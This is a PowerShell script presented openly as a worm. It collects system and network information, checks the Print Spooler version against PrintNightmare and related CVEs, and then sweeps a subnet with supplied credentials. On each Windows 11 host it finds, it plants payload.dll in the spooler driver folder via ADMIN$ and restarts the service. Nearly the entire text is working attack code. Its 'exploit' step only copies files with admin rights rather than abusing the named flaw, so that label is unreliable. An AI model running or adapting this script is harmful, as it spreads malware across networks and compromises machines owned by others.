# --- Section 0: Configuration ---
$PayloadDll = "C:\Windows\Temp\dropper\payload.dll"
$SubnetPrefix = "192.168.1"  # change as needed
$TriggerCVE = "CVE-2021-34527"

# --- Section 1: Utility (fileless) ---
function Invoke-Lolbin {
    param([string]$cmd)
    try { & cmd /c $cmd 2>$null } catch { return $null }
}

function Get-SpoolerVersion {
    try {
        $path = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Spooler" -Name "ImagePath").ImagePath
        $exe = $path -replace '"','' -split ' ' | Select-Object -First 1
        return (Get-Command $exe).FileVersionInfo.FileVersion
    } catch { return $null }
}

# --- Section 2: Passive Discovery Phase ---
$sysInfo = Invoke-Lolbin "systeminfo"
$netInfo = Invoke-Lolbin "ipconfig /all"
$netNeighbors = Invoke-Lolbin "netsh wlan show networks mode=bssid"
$spoolerService = Invoke-Lolbin "sc qc spooler"
$spoolerVersion = Get-SpoolerVersion
$printUpdatesRaw = Invoke-Lolbin "wmic qfe get HotFixID,Description,InstalledOn"
$printUpdates = ($printUpdatesRaw | Where-Object { $_ -match "Print" }) -join "`n"

$cvePrintSpooler = @(
    @{CVE="CVE-2021-34527";Version="10.0.19041.928";Score=8.8;Description="PrintNightmare"},
    @{CVE="CVE-2021-34481";Version="10.0.19041.906";Score=7.8;Description="Spooler Escalation"},
    @{CVE="CVE-2022-23277";Version="10.0.19041.1826";Score=7.8;Description="Spooler Escalation"}
)

$vulnerabilities = foreach ($cve in $cvePrintSpooler) {
    if ($spoolerVersion -and ([version]$spoolerVersion -lt [version]$cve.Version)) {
        [PSCustomObject]@{
            CVE = $cve.CVE
            Description = $cve.Description
            InstalledVersion = $spoolerVersion
            Vulnerable = $true
        }
    }
}

$discoveredCVE = $vulnerabilities | Where-Object { $_.CVE -eq $TriggerCVE -and $_.Vulnerable }

# --- Section 3: Conditional Worm Activation ---
if ($discoveredCVE) {
    Write-Host "[+] $TriggerCVE confirmed. Starting worm propagation..."

    function Invoke-WormPrintNightmare {
        param (
            [string]$PayloadDllPath,
            [string]$SubnetPrefix,
            [PSCredential]$Credential
        )
        $infected = @{}
        foreach ($i in 1..254) {
            $target = "$SubnetPrefix.$i"
            if ($infected.ContainsKey($target)) { continue }
            if (Test-Connection -ComputerName $target -Count 1 -Quiet) {
                try {
                    $os = Invoke-Command -ComputerName $target -Credential $Credential -ScriptBlock {
                        (Get-CimInstance Win32_OperatingSystem).Caption
                    }
                    if ($os -like "*Windows 11*") {
                        Write-Host "[*] Infecting $target..."
                        Invoke-PrintNightmare-Exploit -TargetHost $target -DllPath $PayloadDllPath -Credential $Credential
                        $infected[$target] = $true
                    }
                } catch {}
            }
        }
    }

    function Invoke-PrintNightmare-Exploit {
        param (
            [string]$TargetHost,
            [string]$DllPath,
            [PSCredential]$Credential
        )
        $remoteTemp = "\\$TargetHost\ADMIN$\Temp\payload.dll"
        Copy-Item -Path $DllPath -Destination $remoteTemp -Force -Credential $Credential

        $exploit = @"
`$dllPath = 'C:\\Windows\\Temp\\payload.dll'
`$source = '$remoteTemp'
Copy-Item -Path `$source -Destination `$dllPath -Force

`$driverDir = 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\'
`$targetDll = Join-Path `$driverDir 'payload.dll'
Copy-Item -Path `$dllPath -Destination `$targetDll -Force

Restart-Service spooler -Force
"@

        Invoke-Command -ComputerName $TargetHost -Credential $Credential -ScriptBlock {
            param($cmd)
            Invoke-Expression $cmd
        } -ArgumentList $exploit
    }

    $creds = Get-Credential
    Invoke-WormPrintNightmare -PayloadDllPath $PayloadDll -SubnetPrefix $SubnetPrefix -Credential $creds
} else {
    Write-Warning "[-] Target not vulnerable to $TriggerCVE"
}
